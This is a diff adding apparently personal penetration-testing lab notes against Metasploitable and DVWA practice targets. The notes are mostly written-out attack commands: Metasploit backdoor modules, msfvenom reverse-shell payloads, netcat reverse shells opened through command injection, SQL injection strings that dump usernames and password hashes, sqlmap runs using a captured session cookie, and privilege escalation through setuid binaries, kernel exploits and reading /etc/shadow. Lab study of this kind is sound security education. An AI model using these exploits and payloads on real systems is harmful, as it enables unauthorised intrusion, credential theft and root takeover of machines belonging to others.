@@ -1,0 +1,247 @@
+(vsFTPd) Telnet Backdoor
+Identified open port 21 in nmap scan
+Instead of manually connecting with telnet I used Metasploit
+Command: use exploit/unix/ftp/vsftpd_2.3.4_backdoor
+Command: run
+I then had a shell inside of the VM
+Escalated to root :)
+
+VNC
+Identified open port 5900 with nmap
+Looked up 5900, its VNC, a similar service to RDP
+Command: use auxiliary/scanner/vnc/vnc_none_auth
+CMD: show options
+CMD: set RHOSTS 192.168.163.129
+(OK my nmap was correct, now to exploit)
+Command: use/auxiliary/scanner/vnc/vnc_login
+Ran the script, turns out the password was “password”
+
+Open Root Shell (seriously)
+Identified open metasploitable root shell on port 1524
+The first attempt is to telnet directly in
+Command: telnet 192.168.163.129 1524
+It worked with no authentication!
+CMD: whoami
+ROOT!
+Wow that was super easy :)
+
+Postgres SQL on port 5432
+Found with nmap
+Command: search PostgreSQL
+Command: use exploit/linux/postgres/postgres_payload
+Set payload to linux/x86/meterpreter/reverse_tcp
+Set RHOSTS and run
+Returns a meterpreter shell
+Convert to an interactive shell
+Command: shell
+Drops to interactive shell
+ctrl^c to return to meterpreter
+Spawn shell
+Command: python -c ‘import pty; pty.spawn(“/bin/sh”)’
+need to write up priv esc
+Priv Esc
+File Uploadj
+(from meterpreter) upload (host file path) (target file path)
+Use vulnerable application to execute file?
+Windows only :( PID migration
+Test on windows machine
+Usage of sudo program
+Find /usr sudo -perm -4000
+I spotted nmap as having sudo!?!
+nmap --interactive
+Inside interactive shell: !sh
+Whoami
+root
+
+MySQL Database
+Identified open MySQL Database on port 3306
+Using same technique as VNC
+Command: use  auxiliary/scanner/mysql/mysql_login
+Wanted a username, gave “root” as username
+Angry about no password, set blank password to “true”
+Command: show options
+Command: set rhosts 192.168.163.129
+Command: set username root
+Command: set blank_passwords true
+Command: run
+It worked, and the successful login with metasploit means that I could gain access through the MySQL open port.
+
+
+
+IRC
+Identified open Unreal IRC on port 6667
+I'm going to look for an exploit with the exploit search in Metasploit
+Command: search Unreal IRCD
+Command: use (backdoor exploit)
+Command: set rhosts 192.168.163.129
+Command: run
+Command: whoami
+Response: root
+
+IRC (Remote Downloader/Executer Exploit)
+Using a Remote Download/Executer Trojan to exploit IRC
+Using searchsploit to find exploit
+Command: searchsploit unreal IRCD
+Command: cp (exploit) /root/Desktop
+So I can change payload later
+Command: msfvenom -p cmd/unix/reverse_perl LHOST=192.168.163.129 LPORT=5555 -f python
+Generates the payload that links back to the Kali VM
+Copy and replace payload in desktop file
+Command: nc -lvp 5555
+Listens on port 5555 so I can gain access
+Command: cd Desktop
+Command: perl 13853.pl 192.168.163.129 6667 1
+(file) (target ip) (target port) (payload number)
+Go back to the nc terminal
+whoami
+Root
+
+DistCC
+search distcc
+use exploit/unix/misc/distcc_exec
+set rhosts 192.168.112.129
+Got unprivileged shell
+
+HTTP (DVWA)
+File Upload
+I am essentially uploading a reverse shell, much like the one I used for the IRC server.
+Using msfvenom again
+Command: msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.112.130 LPORT=55555 -f raw > shell.php
+Command: use multi/handler
+Command: set payload php/meterpreter/reverse_tcp
+Command: set LHOST 192.168.112.130
+Command: set LPORT 55555
+Command: exploit
+Executes, but no responses from handler?
+SQL Injection
+We are given a “User ID:” prompt
+After a few prompts, (and the title), the prompt connects to a SQL database
+Suspicion confirmed below
+Command: 1
+ID:  1									                       First name: admin							            Surname: admin
+Command: $’ or ‘0’=’0
+(Displays all the users)
+Used to enumerate the SQL database
+There is no “$” user in the database
+Shows all negative results
+‘0’=’0’ is true…
+Shows all positive results
+Command: $’ or 0=0 union SELECT null, version() #
+Builds off previous, but also displays the version of server
+Also enumeration
+Same logic as above for “$’ or 0=0”
+Union command used to allow more injections
+https://www.w3schools.com/sql/sql_union.asp
+SELECT null used to cancel out the original SELECT
+Null used as a filler value
+https://www.w3schools.com/sql/sql_null_values.asp
+“version() #” used to get version of server
+Server running “5.0.51a-3ubuntu5”
+Command: $’ or 0=0 union SELECT null, user() #
+Again, builds off previous command
+Also enumeration
+“user()” command will show all users on the server
+Found “root@localhost”
+This is the behind the scenes account executing the code
+Command: $’ or 0=0 union SELECT null, database() #
+Again, builds off previous command
+Also enumeration
+“database()” command will show the name of the database
+Found “dvwa” 
+This is the name of the database
+Command: $' union select null, table_name from information_schema.tables where table_name like 'users'#
+I got stuck here, looked online for help
+In essence, the command does the above and:
+Identifies where in the server the user passwords are stored
+Found the password locations
+Also realized that I didn't need to see users anymore, removed 0=0
+Command: $' union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+Displaying all column data from “users”
+New command, concat:
+https://www.w3schools.com/sql/func_mysql_concat.asp
+Found a lot of good stuff like a Password column
+Command: $' union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
+I have all usernames and password combinations
+Passwords are in an MD5 hash
+Admin = Username	
+Password = password
+SQL Injection (Blind)
+Lauched Burpsuite, and adjusted the listener to work with Friefox
+Changed port to 4444 because 8080 wasn’t accepted
+Used Burp to intercept the cookie
+Got the PHP Session ID (in hex)
+Opened a terminal and launched SQLmap
+Command: sqlmap -u “webaddress” --cookie=”actualcookie” --dbs
+Found the same vulnerability as above, and enumerated the databases
+Found 8 total databases, we are looking into “dvwa”
+Enumerate the tables in database DVWA
+Command: sqlmap -u “webaddress” --cookie=”actualcookie” -D dvwa --tables
+Discovered 2 tables, guestbook and users
+We are certainly interested in users
+Enumerate the columns in users
+Command: sqlmap -u “webaddress” --cookie=”actualcookie” -D dvwa -T users --columns
+We have located the passwords file
+Decrypting the passwords
+Command: sqlmap -u “webaddress” --cookie=”actualcookie” -D dvwa -T users -C user,password --dump
+Note the comma in “user,password”
+We have the MD5 hashes of all our users!
+Run dictionary cracker when prompted
+Should output cleartext passwords
+Command Execution
+Testing Limitations
+Tried following its rules, pinged 8.8.8.8
+Clearly a shell response, I have a webshell
+Utilizing the Shell
+Command: dir
+No response
+Command: 8.8.8.8 | ls
+Nice, this worked, can see directory files
+Command: 8.8.8.8 | nc -lp 55555 -e /bin/bash
+Ok, started a netcat reverse shell
+Command: (from Kali machine) nc victim-ip 55555
+Command: whoami
+Response: www-data
+Local Privilege Escalation With Unprivileged Shell
+Command: python -c ‘import pty;pty.spawn(“/bin/bash”)’
+Gives normal shell if one is not given
+Enumerate
+Command: uname -a
+Gives Linux version
+Now search for an exploit in exploit-db
+Get an Exploit
+Command Searchsploit Linux Kernel 2.6
+Found one I liked
+/usr/share/exploitdb /exploits/linux/local/40839.c
+Called = Dirty_Cow
+Copied it to the /tmp directory
+Launched a web server
+Command: python -m SimpleHTTPServer
+Incomplete
+LPE with Unprivileged Shell
+Exploits/linux/local/8572.c	
+Found With Searchsploit
+Create a bash script that makes a reverse nc shell
+Using wget and SimpleHTTPServer
+
+
+Method #2
+Searched for files owned by root
+Command: find / -user root -perm -4000 -exec ls -lbs {} \; > setuid.txt
+Used nano (which uses root)
+Looked in /etc/shadow
+Tomcat Server (port 8180)
+Enumerated with nmap -T4 -A -sV -p 8180
+Apache Tomcat
+Visit page
+A default apache tomcat page, nothing appears to be configured.
+Bruteforce (assuming default creds)
+use auxiliary/scanner/http/tomcat_mgr_login
+Found tomcat:tomcat is user:pass
+Information Gathering
+From Status page:
+2.6.24-16-server - Useful in priv esc
+Apache Tomcat/5.5	
+JVM Version: 1.5.0
+Meterpreter Shell
+
+
